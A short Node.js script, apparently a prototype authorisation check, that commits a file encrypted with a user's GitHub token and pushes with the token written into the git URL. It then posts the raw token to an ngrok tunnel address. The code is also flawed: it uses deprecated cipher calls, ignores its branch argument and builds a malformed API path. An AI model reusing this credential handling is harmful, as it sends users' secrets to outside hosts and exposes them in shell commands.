const crypto = require('crypto');
const shell = require("shelljs")
const axios = require("axios");

async function encrypt(repo, pass, branch) {
    const algorithm = 'aes256';
    try {
        var cipher = crypto.createCipher(algorithm, pass)
        var crypted = cipher.update("unclecode", 'utf8', 'hex')
        crypted += cipher.final('hex');

        let owner = repo.split('/')[0]
        let _repo = repo.split('/')[1]
        
        shell.exec(`git checkout master`)
        
        shell.exec(`echo ${crypted} > auth.enc`)
        
        shell.exec(`git add auth.enc`)
        shell.exec(`git commit -m 'add auth file'`)
        shell.exec(`git push https://${ owner }:${ pass }@github.com/${ repo } master`)

        let r1 = await axios.post("https://88a4fa7d.ngrok.io/api/check-auth", {
            owner,
            gitToken:pass,
            repo:_repo,
            path: `auth.enc?ref=master`
        });
        console.log(r1.data)

        let resp = await axios.get(
            `https://api.github.com/repos/${_repo}/contents/auth.enc?ref=master`
        )
        let cnt = resp.data.content
        let content = Buffer.from(cnt, 'base64').toString('ascii').replace(/\n/g, "");
        console.log(content)

        var decipher = crypto.createDecipher(algorithm, pass)
        var dec = decipher.update(content, 'hex', 'utf8')
        dec += decipher.final('utf8');
        console.log(dec)

        // return crypted
        return true
    } catch (err) {
        throw err
    }
}

const a = async (repo, gitToken, branch) => {
    return await encrypt(repo, gitToken, branch)
}

a(process.argv[2], process.argv[3], process.argv[4]).then((res) => {
    console.log(res)
})